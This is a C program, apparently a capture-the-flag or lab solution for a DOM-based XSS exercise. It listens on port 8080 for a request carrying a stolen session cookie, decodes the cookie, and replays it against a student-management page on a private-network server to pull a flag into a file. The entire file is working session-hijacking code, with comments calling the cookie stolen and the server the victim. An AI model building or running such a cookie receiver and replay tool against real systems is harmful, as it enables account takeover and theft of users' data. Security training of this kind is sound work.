#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <ctype.h>

#define PORT 8080
#define BUF_SZ 16384

#define HOST "http://192.168.1.203:80/"
#define PATH "/studentManagerDOMBASED.php"
#define SERVER_IP "192.168.1.201"
#define WEBSERVER_IP "192.168.1.203"

int hexval(char c) {
    if ('0' <= c && c <= '9') return c - '0';
    if ('a' <= c && c <= 'f') return c - 'a' + 10;
    if ('A' <= c && c <= 'F') return c - 'A' + 10;
    return -1;
}

// URL decoder to decode the cookie
void urldecode(char *s) {
    char *src = s;
    char *dst = s;

    while (*src) {
        if (*src == '%' &&
            isxdigit((unsigned char)src[1]) &&
            isxdigit((unsigned char)src[2])) {

            int hi = hexval(src[1]);
            int lo = hexval(src[2]);
            *dst++ = (char)((hi << 4) | lo);
            src += 3;
            } else if (*src == '+') {
                *dst++ = ' ';
                src++;
            } else {
                *dst++ = *src++;
            }
    }
    *dst = '\0';
}

void receiveCookie(char *cookie, size_t cookie_sz) {
    //socket listenning on port 8080, waiting to receive http get request with the stolen cookie.
    //in this case we are waiting to get request and not post request to avid the browser hardness .
    int s  = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) exit(0);

    int opt = 1;
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(s);
        exit(0);
    }

    opt = 1;
    if (setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(s);
        exit(0);
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(s);
        exit(0);
    }

    if (listen(s, 1) < 0) {
        close(s);
        exit(0);
    }
    int c = accept(s, NULL, NULL);
    if (c < 0) {
        close(s);
        exit(0);
    }

    char buf[BUF_SZ];
    ssize_t n = recv(c, buf, sizeof(buf) - 1, 0);
    if (n <= 0) {
        close(c);
        close(s);
        exit(0);
    }
    buf[n] = '\0';
    char *get_line = buf;
    char *line_end = strstr(buf, "\r\n");
    if (!line_end) {
        close(c);
        close(s);
        exit(0);
    }

    //find cookie in the get request
    char *cookie_start = strstr(get_line, "cookie=");
    if (!cookie_start) {
        close(c);
        close(s);
        exit(0);
    }

    cookie_start += 7;

    char* cookie_end = strchr(cookie_start, ' ');
    if (!cookie_end) {
        cookie_end = strstr(cookie_start, " HTTP");
    }
    if (!cookie_end) {
        close(c);
        close(s);
        exit(0);
    }

    size_t len = (size_t)(cookie_end - cookie_start);
    if (len >= cookie_sz) {
        len = cookie_sz - 1;
    }
    memcpy(cookie, cookie_start, len);
    cookie[len] = '\0';

    //http response
    const char resp[] =
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: 2\r\n"
        "Connection: close\r\n"
        "\r\nOK";
    (void)send(c, resp, sizeof(resp) - 1, 0);

    close(c);
    close(s);
}

void getFlagFromGrades(char *cookie) {
    //socket to send http get request with the stolen cookie to the wanted path.
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(0);

    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port = htons(80);
    if (inet_pton(AF_INET, WEBSERVER_IP, &srv.sin_addr) != 1) exit(0);
    if (connect(sockfd, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        exit(0);
    }

    //decoding the received cookie cause its url decoded.
    urldecode(cookie);
    char req[2048];
    //get request to the victim server with port 80(http) with the stolen cookie.
    int n = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "Cookie: %s\r\n"
        "\r\n",
        PATH, WEBSERVER_IP, cookie);
    if (n < 0 || n >= (int)sizeof(req)) exit(0);

    size_t off = 0, len = (size_t)n;
    while (off < len) {
        ssize_t s = send(sockfd, req + off, len - off, 0);
        if (s <= 0) exit(0);
        off += (size_t)s;
    }

    FILE *fp = fopen("spoofed-dom.txt", "wb");
    if (!fp) exit(0);

    //store the response in the requested file.
    char buf[8192];
    for (;;) {
        ssize_t r = recv(sockfd, buf, sizeof(buf), 0);
        if (r == 0) break;
        if (r < 0) exit(0);
        fwrite(buf, 1, (size_t)r, fp);
    }

    fclose(fp);
    close(sockfd);
}


int main(void) {
    // buffer to store the cookie
    char cookie[1024] = {0};
    //receive the cookie
    receiveCookie(cookie, sizeof(cookie));
    //get the flag by using the received cookie
    getFlagFromGrades(cookie);
    exit (0);
}
